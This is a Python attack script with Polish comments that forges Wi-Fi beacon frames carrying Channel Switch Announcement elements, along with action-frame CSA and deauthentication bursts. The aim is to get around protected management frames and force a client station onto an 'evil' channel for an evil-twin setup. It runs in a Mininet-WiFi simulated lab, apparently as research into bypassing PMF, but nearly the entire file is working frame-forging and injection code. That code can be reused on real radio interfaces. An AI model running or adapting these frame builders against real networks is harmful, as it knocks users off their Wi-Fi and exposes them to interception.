#!/usr/bin/env python3
"""
atak beacon csa injection
beacony subtype 8 nigdy nie sa chronione przez pmf, w przeciwienstwie do action frames subtype 13
dziala na wszystkich wersjach hostapd
wysyla sfalszowane beacony z csa ie tag 37 zeby zmusic klienta do zmiany kanalu
"""

import argparse
import os
import re
import sys
import time
from datetime import datetime

from mn_wifi.net import Mininet_wifi
from mininet.log import setLogLevel, info
from scapy.all import (
    RadioTap, Dot11, Dot11Beacon, Dot11Elt,
    sendp, wrpcap,
)
# Scapy layers are auto-loaded by RadioTap/Dot11 imports

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOSTAPD_CONF = os.path.join(BASE_DIR, "configs", "hostapd.conf")
WPA_CONF = os.path.join(BASE_DIR, "configs", "wpa_supplicant.conf")
RAPORT_DIR = os.path.join(os.path.dirname(BASE_DIR), "raport")
IFACE = "wlan0"


# narzedzia

def ts():
    return datetime.now().strftime("%H:%M:%S")


def get_node_mac(node):
    """wyciaga MAC z ip link, bo wintfs.mac jest None w tej wersji Mininet-WiFi"""
    r = node.cmd("ip -c=never link show wlan0")
    m = re.search(r'link/ether ([0-9a-f:]+)', r)
    return m.group(1) if m else "00:00:00:00:00:01"


def check_associated(sta):
    r = sta.cmd(f"iw dev {IFACE} link")
    return "Not connected" not in r


def get_sta_channel(sta):
    r = sta.cmd(f"iw dev {IFACE} info")
    for line in r.split("\n"):
        if "channel" in line:
            try:
                return int(line.strip().split()[1])
            except (IndexError, ValueError):
                pass
    return None


# budowanie ramki beacon csa

def build_beacon_csa(ap_mac, ssid, current_channel, new_channel, switch_count=3):
    """
    buduje sfalszowany beacon frame z csa information element (tag 37)

    struktura: RadioTap | Dot11(type=0,subtype=8) | Dot11Beacon | Dot11Elt(SSID) | Dot11Elt(Rates) | Dot11Elt(DSset) | Dot11Elt(ID=37, CSA)

    csa ie (tag 37) - 3 bajty:
      bajt 0: channel switch mode (0x01)
      bajt 1: new channel number
      bajt 2: channel switch count
    """
    # Channel Switch Announcement IE (tag 37) — 3-bajtowe body
    # Dot11Elt automatycznie dodaje Element ID i Length
    csa_body = bytes([
        0x01,            # Channel Switch Mode: ograniczenia TX do switch
        new_channel,     # New Channel Number
        switch_count,    # Channel Switch Count
    ])

    frame = RadioTap() / Dot11(
        type=0, subtype=8,          # Management / Beacon
        addr1="ff:ff:ff:ff:ff:ff",  # DA = broadcast
        addr2=ap_mac,               # SA = spoofed AP MAC
        addr3=ap_mac,               # BSSID = AP MAC
    ) / Dot11Beacon(
        timestamp=0,
        beacon_interval=0x0064,     # 100 TU (102.4 ms)
        cap=0x0431,                 # ESS + Privacy + ShortPreamble
    ) / Dot11Elt(ID="SSID", info=ssid.encode()) \
      / Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') \
      / Dot11Elt(ID="DSset", info=bytes([current_channel])) \
      / Dot11Elt(ID=37, info=csa_body)

    return frame


def build_action_csa(target_mac, ap_mac, new_channel, switch_count=1):
    """
    legacy: buduje action frame csa - dziala tylko na hostapd < 2.7
    zachowane dla testow porownawczych
    """
    csa_element = bytes([
        0x25,           # Element ID: CSA (37)
        0x03,           # Length: 3
        0x01,           # Channel Switch Mode
        new_channel,
        switch_count,
    ])

    from scapy.all import Dot11Action, Raw
    frame = RadioTap() / Dot11(
        type=0, subtype=13,          # Management / Action
        addr1=target_mac,
        addr2=ap_mac,
        addr3=ap_mac,
    ) / Dot11Action() / Raw(load=csa_element)

    return frame


# silnik injekcji

class CsaInjectionEngine:
    """
    silnik csa injection - beacon + action + multi-burst timing

    strategie z politician:
      - burst: wiele ramek w krotkich odstepach (imitacja beacon interval)
      - repeat: powtorzenie burstu po krotkim czasie
      - combined: beacon csa + action csa + deauth dla maksymalnej skutecznosci
    """

    def __init__(self, target_sta, ap_node, legit_channel, evil_channel, ssid):
        self.sta = target_sta
        self.ap = ap_node
        self.legit_channel = legit_channel
        self.evil_channel = evil_channel
        self.ssid = ssid
        self.target_mac = get_node_mac(target_sta)
        self.ap_mac = get_node_mac(ap_node)
        self._results = []

    def send_beacon_csa_burst(self, count=30, inter=0.1024, switch_count=1):
        """
        wysyla burst sfalszowanych beaconow z csa ie

        domyslnie imituje beacon interval (~102.4ms = 100 TU)
        switch_count=1 -> klient ma przelaczyc sie po 1 beaconie
        """
        frame = build_beacon_csa(
            self.ap_mac, self.ssid,
            self.legit_channel, self.evil_channel,
            switch_count
        )

        # komenda scapy do wykonania wewnatrz namespace
        frame_hex = bytes(frame).hex()
        scapy_cmd = (
            f'python3 -c "'
            f'from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp;'
            f"frame = bytes.fromhex('{frame_hex}');"
            f"pkt = RadioTap(frame);"
            f"sendp(pkt, iface='{IFACE}', count={count}, inter={inter}, verbose=True);"
            f'print(''SENT'')"'
        )

        info(f"  [{ts()}] Sending {count} Beacon CSA frames "
             f"(switch to ch {self.evil_channel}, interval {inter*1000:.0f}ms)\n")

        result = self.sta.cmd(scapy_cmd)
        sent = result.count(b'>') if isinstance(result, bytes) else result.count('>')
        info(f"  [{ts()}] Frames acknowledged by Scapy: {sent}/{count}\n")
        self._results.append(("beacon_csa", count, sent))
        return sent

    def send_action_csa_burst(self, count=10, inter=0.05):
        """legacy: action frame csa - tylko dla hostapd < 2.7"""
        from scapy.all import Dot11Action, Raw

        csa_element = bytes([0x25, 0x03, 0x01, self.evil_channel, 1])
        frame = RadioTap() / Dot11(
            type=0, subtype=13,
            addr1=self.target_mac,
            addr2=self.ap_mac,
            addr3=self.ap_mac,
        ) / Dot11Action() / Raw(load=csa_element)

        frame_hex = bytes(frame).hex()
        scapy_cmd = (
            f'python3 -c "'
            f'from scapy.all import RadioTap, Dot11, Dot11Action, Raw, sendp;'
            f"frame = bytes.fromhex('{frame_hex}');"
            f"pkt = RadioTap(frame);"
            f"sendp(pkt, iface='{IFACE}', count={count}, inter={inter}, verbose=True);"
            f'print(''SENT'')"'
        )

        info(f"  [{ts()}] Sending {count} Action CSA frames (legacy, hostapd < 2.7)\n")
        result = self.sta.cmd(scapy_cmd)
        sent = result.count(b'>') if isinstance(result, bytes) else result.count('>')
        info(f"  [{ts()}] Action frames sent: {sent}/{count}\n")
        self._results.append(("action_csa", count, sent))
        return sent

    def send_deauth_burst(self, count=5, reason=7):
        """wysyla ramki deauth jako uzupelnienie csa"""
        frame_hex = bytes(RadioTap() / Dot11(
            type=0, subtype=12,
            addr1=self.target_mac,
            addr2=self.ap_mac,
            addr3=self.ap_mac,
        ) / b'\x07\x00').hex()

        scapy_cmd = (
            f'python3 -c "'
            f'from scapy.all import RadioTap, Dot11, sendp;'
            f"frame = bytes.fromhex('{frame_hex}');"
            f"pkt = RadioTap(frame);"
            f"sendp(pkt, iface='{IFACE}', count={count}, inter=0.02, verbose=True);"
            f'print(''SENT'')"'
        )

        info(f"  [{ts()}] Sending {count} Deauth frames (reason={reason})\n")
        result = self.sta.cmd(scapy_cmd)
        sent = result.count(b'>') if isinstance(result, bytes) else result.count('>')
        self._results.append(("deauth", count, sent))
        return sent

    def combined_attack(self, beacon_count=30, action_count=10, deauth_count=5):
        """
        atak kombinowany politician-style:
          1. beacon csa burst - glowny wektor, dziala na wszystkich wersjach
          2. krotka pauza na przetworzenie csa
          3. action csa burst - dodatkowy wektor dla hostapd < 2.7
          4. deauth burst - fallback, dziala tylko bez pmf
        """
        info(f"\n  [{ts()}] === COMBINED ATTACK ===\n")

        # 1. Beacon CSA — glowny wektor
        self.send_beacon_csa_burst(count=beacon_count, switch_count=1)

        # 2. chwila na przetworzenie
        time.sleep(1.0)

        # 3. Action CSA — drugi wektor
        self.send_action_csa_burst(count=action_count)

        # 4. Deauth — fallback
        self.send_deauth_burst(count=deauth_count)

    def get_results_summary(self):
        """zwraca podsumowanie wyslanych ramek"""
        total_sent = sum(sent for _, _, sent in self._results)
        return {
            "total_frames": total_sent,
            "by_type": self._results,
        }


# glowna funkcja ataku

def run_beacon_csa_attack(target_name="sta1", evil_channel=11,
                          beacon_count=30, action_count=10, deauth_count=5,
                          wait_time=10, evil_twin_ssid=None):
    """
    glowna funkcja ataku beacon-based csa injection

    przebieg:
      1. start topologii Mininet-WiFi (1 AP + 3 stacje)
      2. czekamy na asocjacje
      3. wysylamy beacon csa burst
      4. czekamy na przelaczenie kanalu
      5. weryfikujemy rezultat
    """
    net = Mininet_wifi()

    info(f"\n[{ts()}] ========================================\n")
    info(f"[{ts()}]   BEACON CSA INJECTION ATTACK\n")
    info(f"[{ts()}] ========================================\n\n")

    # 1. topologia
    info(f"[{ts()}] Building topology...\n")

    ap1 = net.addAccessPoint(
        "ap1", ssid="PMF_Lab_Secure", mode="g", channel="6",
        failMode="standalone"
    )
    ap1.setMasterMode(intf="ap1-wlan1", ssid="PMF_Lab_Secure", channel="6", mode="g")
    
    sta1 = net.addStation("sta1", wpas_params=["-c", WPA_CONF])
    sta2 = net.addStation("sta2", wpas_params=["-c", WPA_CONF])
    sta3 = net.addStation("sta3", wpas_params=["-c", WPA_CONF])

    stations = {"sta1": sta1, "sta2": sta2, "sta3": sta3}
    target = stations.get(target_name)
    if target is None:
        info(f"[ERROR] Unknown target: {target_name}\n")
        return False

    net.setPropagationModel(model="logDistance", exp=3.5)
    net.configureNodes()
    net.addLink(ap1, sta1)
    net.addLink(ap1, sta2)
    net.addLink(ap1, sta3)
    net.start()

    info(f"[{ts()}] Waiting 15s for association + DHCP...\n")
    time.sleep(15)

    # 2. sprawdzenia przed atakiem
    if not check_associated(target):
        info(f"[ERROR] {target_name} not associated. Aborting.\n")
        net.stop()
        return False

    legit_channel = get_sta_channel(target)
    if legit_channel is None:
        info("[ERROR] Cannot determine station channel.\n")
        net.stop()
        return False

    info(f"\n[{ts()}] === PRE-ATTACK STATUS ===\n")
    info(f"  Target:      {target_name}\n")
    info(f"  Target MAC:  {get_node_mac(target)}\n")
    info(f"  AP MAC:      {get_node_mac(ap1)}\n")
    info(f"  Channel:     {legit_channel}\n")
    info(f"  Associated:  YES\n")

    if legit_channel == evil_channel:
        info(f"[ERROR] Evil channel ({evil_channel}) == legit channel ({legit_channel}).\n")
        net.stop()
        return False

    # 3. atak
    engine = CsaInjectionEngine(target, ap1, legit_channel, evil_channel, "PMF_Lab_Secure")
    engine.combined_attack(
        beacon_count=beacon_count,
        action_count=action_count,
        deauth_count=deauth_count,
    )

    # 4. czekamy i weryfikujemy
    info(f"\n[{ts()}] Waiting {wait_time}s for channel switch...\n")
    time.sleep(wait_time)

    info(f"\n[{ts()}] === POST-ATTACK STATUS ===\n")
    post_channel = get_sta_channel(target)
    post_associated = check_associated(target)

    info(f"  {target_name} channel:  {post_channel}\n")
    info(f"  {target_name} associated: {post_associated}\n")

    summary = engine.get_results_summary()
    info(f"  Total frames sent:  {summary['total_frames']}\n")

    # 5. analiza
    info(f"\n[{ts()}] === ANALYSIS ===\n")

    if post_channel == evil_channel:
        info(f"\n[SUCCESS] Station switched to channel {post_channel}!\n")
        info(f"          Beacon CSA bypassed PMF on this hostapd version.\n")
        result = "SUCCESS"
    elif post_channel != legit_channel and post_channel is not None:
        info(f"\n[ANOMALY] Station moved to unexpected channel {post_channel}.\n")
        result = "ANOMALY"
    elif not post_associated:
        info(f"\n[PARTIAL] Station disassociated (deauth may have worked).\n")
        result = "PARTIAL"
    else:
        info(f"\n[BLOCKED] Station stayed on channel {post_channel}.\n")
        info(f"          CSA was blocked. Try: --beacon-count 50, --deauth-count 10\n")
        result = "BLOCKED"

    # 6. zapis dowodow
    os.makedirs(os.path.join(RAPORT_DIR, "pcaps", "beacon_csa"), exist_ok=True)
    log_path = os.path.join(
        RAPORT_DIR, "pcaps", "beacon_csa",
        f"beacon_csa_{target_name}_ch{evil_channel}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    )
    with open(log_path, "w") as f:
        f.write(f"Attack: Beacon CSA Injection\n")
        f.write(f"Target: {target_name}\n")
        f.write(f"Legit channel: {legit_channel}\n")
        f.write(f"Evil channel: {evil_channel}\n")
        f.write(f"Result: {result}\n")
        f.write(f"Frames: {summary}\n")

    info(f"[{ts()}] Log saved to: {log_path}\n")

    net.stop()
    return result == "SUCCESS"


# cli

def parse_args():
    parser = argparse.ArgumentParser(
        description="PMF Bypass: Beacon CSA Injection Attack (Politician-inspired)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 attacks/beacon_csa.py
  sudo python3 attacks/beacon_csa.py --target sta1 --evil-channel 11 --beacon-count 50
  sudo python3 attacks/beacon_csa.py --target sta2 --evil-channel 1 --deauth-count 10
  sudo python3 attacks/beacon_csa.py --beacon-count 100 --no-action  # Beacon-only, no Action frames
        """,
    )
    parser.add_argument("--target", default="sta1",
                        help="Target station (sta1, sta2, sta3)")
    parser.add_argument("--evil-channel", type=int, default=11,
                        help="Channel for Evil Twin / target channel")
    parser.add_argument("--beacon-count", type=int, default=30,
                        help="Number of Beacon CSA frames per burst")
    parser.add_argument("--action-count", type=int, default=10,
                        help="Number of Action CSA frames (legacy, for hostapd < 2.7)")
    parser.add_argument("--deauth-count", type=int, default=5,
                        help="Number of Deauth frames (fallback)")
    parser.add_argument("--no-action", action="store_true",
                        help="Skip Action CSA frames (beacon-only mode)")
    parser.add_argument("--no-deauth", action="store_true",
                        help="Skip Deauth frames")
    parser.add_argument("--wait", type=int, default=10,
                        help="Seconds to wait after attack for verification")
    return parser.parse_args()


if __name__ == "__main__":
    setLogLevel("info")
    args = parse_args()

    action_cnt = 0 if args.no_action else args.action_count
    deauth_cnt = 0 if args.no_deauth else args.deauth_count

    success = run_beacon_csa_attack(
        target_name=args.target,
        evil_channel=args.evil_channel,
        beacon_count=args.beacon_count,
        action_count=action_cnt,
        deauth_count=deauth_cnt,
        wait_time=args.wait,
    )
    sys.exit(0 if success else 1)
